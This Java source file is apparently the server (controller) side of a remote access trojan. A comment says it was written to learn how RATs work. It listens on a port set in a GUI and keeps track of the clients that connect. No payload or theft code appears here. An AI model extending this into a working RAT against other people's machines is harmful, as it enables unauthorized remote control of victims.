package me.sebsb;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import me.sebsb.gui.GuiMain;

/*
 * Don't rat people, its bad. 
 * I only wrote this program to learn how rats work.
 */
public class Server {

	private ArrayList<ConnectedClient> clients = new ArrayList<ConnectedClient>();
	private ServerSocket ss;
	private static Server instance;
	
	private GuiMain gui;
	private Thread searchThread;
	
	public Server() throws IOException {
		gui = new GuiMain(this);
		// waits until the user has set the port
		while (gui.getPort() == -1) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		this.changePort(gui.getPort());
	}
	
	private int lastPort = -1;
	
	public void changePort(int port) {
		if (lastPort == port) {
			return;
		}
		lastPort = port;
		if (searchThread != null && searchThread.isAlive()) {
			searchThread.stop();
		}
		
		if (ss != null && !ss.isClosed()) {
			try {
				ss.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		
		searchThread = new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					ss = new ServerSocket(port);
					while (true) {
						try {
							Socket s = ss.accept();
							clients.add(new ConnectedClient(s));
							gui.updateInfo();
						} catch (Exception e) {
							e.printStackTrace();
						} catch (ThreadDeath e2) {
							e2.printStackTrace();
						}
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		});
		searchThread.setName(port + "");
		searchThread.start();
	}
	
	public GuiMain getGUI() {
		return this.gui;
	}
	
	public void removeClient(ConnectedClient client) {
		if (this.clients.contains(client)) {
			this.clients.remove(client);
			this.gui.updateInfo();
		}
	}
	
	public ArrayList<ConnectedClient> getClients() {
		return this.clients;
	}
	
	public static void main(String[] args) throws IOException {
		instance = new Server();
	}
	
	public static Server getInstance() {
		return instance;
	}
}
